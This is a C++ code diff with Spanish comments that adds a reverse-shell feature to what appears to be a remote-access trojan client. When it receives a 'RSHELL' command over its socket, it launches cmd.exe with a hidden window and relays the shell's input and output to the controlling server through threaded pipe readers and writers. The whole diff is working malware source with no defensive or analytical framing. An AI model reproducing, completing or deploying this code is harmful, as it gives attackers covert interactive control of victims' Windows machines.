@@ -109,6 +109,10 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
     }
 
+    if (strIn[0] == "RSHELL") {
+        this->SpawnShell("C:\\Windows\\System32\\cmd.exe");
+    }
+
 #ifdef ___DEBUG_
     std::cout << "Enviados "<<iEnviado<<" bytes\n";
 #endif
@@ -264,4 +268,162 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
         std::cout << "Error desencriptando " << pInput << "\n";
     }
     return bOutput;
+}
+
+//Reverse shell
+void Cliente::SpawnShell(const std::string pstrComando) {
+#ifdef ___DEBUG_
+    std::cout << "Lanzando " << pstrComando << "\n";
+#endif
+    PROCESS_INFORMATION pi;
+    HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
+    stdinRd = stdinWr = stdoutRd = stdoutWr = nullptr;
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.lpSecurityDescriptor = nullptr;
+    sa.bInheritHandle = true;
+    if (!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
+#ifdef ___DEBUG_
+        std::cout << "Error creando tuberias\n";
+        error();
+#endif
+        return;
+    }
+    STARTUPINFO si;
+    GetStartupInfo(&si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdOutput = stdoutWr;
+    si.hStdError = stdoutWr;
+    si.hStdInput = stdinRd;
+    char cCmd[1024];
+    ZeroMemory(cCmd, sizeof(cCmd));
+    strncpy(cCmd, pstrComando.c_str(), 1024);
+    if (CreateProcess(nullptr, cCmd, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi) == 0) {
+#ifdef ___DEBUG_
+        std::cout << "No se pudo spawnear la shell\n";
+        error();
+#endif
+        return;
+    }
+    
+    //La shell esta corriendo
+    this->isShellRunning = true;
+    this->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);
+
+    std::thread tRead(&Cliente::thLeerShell, this, stdoutRd);
+    std::thread tWrite(&Cliente::thEscribirShell, this, stdinWr);
+    tRead.join();
+    tWrite.join();
+    
+    //La shell termino, enviar codigo a server
+    this->cSend(this->sckSocket, "05\\Done, omar :v", 17, 0, false);
+
+    TerminateProcess(pi.hProcess, 0);
+    if (stdinRd != nullptr) {
+        CloseHandle(stdinRd);
+        stdinRd = nullptr;
+    }
+    if (stdinWr != nullptr) {
+        CloseHandle(stdinWr);
+        stdinWr = nullptr;
+    }
+    if (stdoutRd != nullptr) {
+        CloseHandle(stdoutRd);
+        stdoutRd = nullptr;
+    }
+    if (stdoutWr != nullptr) {
+        CloseHandle(stdoutWr);
+        stdoutWr = nullptr;
+    }
+
+    this->isShellRunning = false;
+}
+
+void Cliente::thLeerShell(HANDLE hPipe) {
+    int iLen = 0, iRet = 0;
+    char cBuffer[2046], cBuffer2[2046 * 2 + 30];
+    DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
+    BYTE bPChar = 0;
+    while (this->isShellRunning) {
+        if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
+            if (dBytesReaded > 0) {
+                ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
+            }
+            else {
+                Sleep(100);
+                continue;
+            }
+            for (dBufferC = 0, dBytesToWrite = 0; dBufferC < dBytesReaded; dBufferC++) {
+                if (cBuffer[dBufferC] == '\n' && bPChar != '\r') {
+                    cBuffer2[dBytesToWrite++] = '\r';
+                }
+                bPChar = cBuffer2[dBytesToWrite++] = cBuffer[dBufferC];
+            }
+            cBuffer2[dBytesToWrite] = '\0';
+            iLen = strlen(cBuffer2);
+
+            //enviar buffer al server
+            std::string strOut = "06\\";
+            strOut += cBuffer2;
+#ifdef ___DEBUG_
+            std::cout << strOut << "\n";
+#endif
+            int isent = this->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
+#ifdef ___DEBUG_
+            std::cout << isent << "\n";
+#endif
+
+        }else {
+#ifdef ___DEBUG_
+            std::cout << "PeekNamedPipe error\n";
+            error();
+#endif
+            std::unique_lock<std::mutex> lock(this->mtx_shell);
+            this->isShellRunning = false;
+            lock.unlock();
+            break;
+        }
+    }
+#ifdef ___DEBUG_
+    std::cout << "Stop reading from shell\n";
+    error();
+#endif
+}
+
+void Cliente::thEscribirShell(HANDLE hPipe) {
+    int iRet = 0;
+    char cRecvBytes[4096], cBuffer[2048];
+    DWORD dBytesWrited = 0, dBufferC = 0;
+    while (this->isShellRunning) {
+        int iRecibido = this->cRecv(this->sckSocket, cRecvBytes, sizeof(cRecvBytes), 0, false);
+
+        std::string strIn = cRecvBytes;
+        if (strIn == "exit\r\n") {
+            std::unique_lock<std::mutex> lock(this->mtx_shell);
+            this->isShellRunning = false;
+            lock.unlock();
+            break;
+        }
+        //if (cRecvBytes[0] == '\n' || cRecvBytes[0] == '\r' || dBufferC > 2047) {
+            if (!WriteFile(hPipe, cRecvBytes, iRecibido, &dBytesWrited, nullptr)) {
+#ifdef ___DEBUG_
+                std::cout << "Error writing to pipe\n";
+                error();
+#endif
+                std::unique_lock<std::mutex> lock(this->mtx_shell);
+                this->isShellRunning = false;
+                lock.unlock();
+                break;
+            }
+#ifdef ___DEBUG_
+            std::cout << "Writed " << dBytesWrited << " bytes\n";
+#endif
+            //dBufferC = 0;
+        //}
+    }
+#ifdef ___DEBUG_
+    std::cout << "Stop writing to shell\n";
+    error();
+#endif
 }
